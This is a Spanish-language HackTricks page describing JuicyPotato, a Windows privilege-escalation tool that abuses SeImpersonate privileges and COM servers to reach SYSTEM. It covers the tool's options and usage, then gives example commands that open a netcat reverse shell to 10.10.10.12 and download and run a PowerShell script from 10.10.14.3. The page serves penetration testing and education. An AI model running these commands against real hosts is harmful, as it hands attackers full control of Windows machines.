# JuicyPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al **grupo de telegram** o **sígueme** en **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato no funciona** en Windows Server 2019 y Windows 10 a partir de la compilación 1809. Sin embargo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) se pueden utilizar para **aprovechar los mismos privilegios y obtener acceso de nivel `NT AUTHORITY\SYSTEM`**. _**Verificar:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (abusando de los privilegios dorados) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Una versión azucarada de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un poco de jugo, es decir, **otra herramienta de Escalada de Privilegios Local, desde una Cuenta de Servicio de Windows a NT AUTHORITY\SYSTEM**_

#### Puedes descargar juicypotato desde [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Resumen <a href="#summary" id="summary"></a>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) y sus [variantes](https://github.com/decoder-it/lonelypotato) aprovechan la cadena de escalada de privilegios basada en el servicio [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) teniendo el escucha MiTM en `127.0.0.1:6666` y cuando tienes los privilegios `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisión de la compilación de Windows encontramos una configuración donde `BITS` estaba deshabilitado intencionalmente y el puerto `6666` estaba ocupado.

Decidimos armar [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Dale la bienvenida a Juicy Potato**.

> Para la teoría, consulta [Rotten Potato - Escalada de Privilegios desde Cuentas de Servicio a SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) y sigue la cadena de enlaces y referencias.

Descubrimos que, además de `BITS`, hay varios servidores COM que podemos abusar. Solo necesitan:

1. ser instanciables por el usuario actual, normalmente un "usuario de servicio" que tiene privilegios de suplantación
2. implementar la interfaz `IMarshal`
3. ejecutarse como un usuario elevado (SYSTEM, Administrador, ...)

Después de algunas pruebas, obtuvimos y probamos una extensa lista de [CLSID's interesantes](http://ohpe.it/juicy-potato/CLSID/) en varias versiones de Windows.

### Detalles Jugosos <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato te permite:

* **Objetivo CLSID** _elige cualquier CLSID que desees._ [_Aquí_](http://ohpe.it/juicy-potato/CLSID/) _puedes encontrar la lista organizada por SO._
* **Puerto de escucha COM** _define el puerto de escucha COM que prefieras (en lugar del 6666 codificado en duro)_
* **Dirección IP de escucha COM** _vincula el servidor a cualquier IP_
* **Modo de creación de proceso** _dependiendo de los privilegios del usuario suplantado, puedes elegir entre:_
* `CreateProcessWithToken` (necesita `SeImpersonate`)
* `CreateProcessAsUser` (necesita `SeAssignPrimaryToken`)
* `ambos`
* **Proceso a lanzar** _lanza un ejecutable o script si la explotación tiene éxito_
* **Argumento del proceso** _personaliza los argumentos del proceso lanzado_
* **Dirección del servidor RPC** _para un enfoque sigiloso, puedes autenticarte en un servidor RPC externo_
* **Puerto del servidor RPC** _útil si deseas autenticarte en un servidor externo y el firewall está bloqueando el puerto `135`..._
* **Modo de PRUEBA** _principalmente para propósitos de prueba, es decir, probar CLSIDs. Crea el DCOM e imprime el usuario del token. Ver_ [_aquí para pruebas_](http://ohpe.it/juicy-potato/Test/) 

### Uso <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Reflexiones finales <a href="#final-thoughts" id="final-thoughts"></a>

Si el usuario tiene privilegios `SeImpersonate` o `SeAssignPrimaryToken`, entonces eres **SYSTEM**.

Es casi imposible prevenir el abuso de todos estos Servidores COM. Podrías pensar en modificar los permisos de estos objetos a través de `DCOMCNFG`, pero buena suerte, esto va a ser un desafío.

La solución actual es proteger las cuentas sensibles y las aplicaciones que se ejecutan bajo las cuentas `* SERVICE`. Detener `DCOM` ciertamente inhibiría este exploit, pero podría tener un impacto grave en el sistema operativo subyacente.

Fuente: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Ejemplos

Nota: Visita [esta página](https://ohpe.it/juicy-potato/CLSID/) para obtener una lista de CLSIDs para probar.

### Obtener una shell inversa con nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev

### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Iniciar un nuevo CMD (si tienes acceso RDP)

![](<../../.gitbook/assets/image (37).png>)

## Problemas con CLSID

A menudo, el CLSID predeterminado que utiliza JuicyPotato **no funciona** y el exploit falla. Por lo general, se necesitan varios intentos para encontrar un **CLSID que funcione**. Para obtener una lista de CLSIDs para probar en un sistema operativo específico, debes visitar esta página:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Verificación de CLSIDs**

Primero, necesitarás algunos ejecutables aparte de juicypotato.exe.

Descarga [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) y cárgalo en tu sesión de PS, y descarga y ejecuta [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ese script creará una lista de posibles CLSIDs para probar.

Luego descarga [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(cambia la ruta a la lista de CLSID y al ejecutable de juicypotato) y ejecútalo. Comenzará a probar cada CLSID, y **cuando el número de puerto cambie, significará que el CLSID funcionó**.

**Verifica** los CLSIDs que funcionan **usando el parámetro -c**
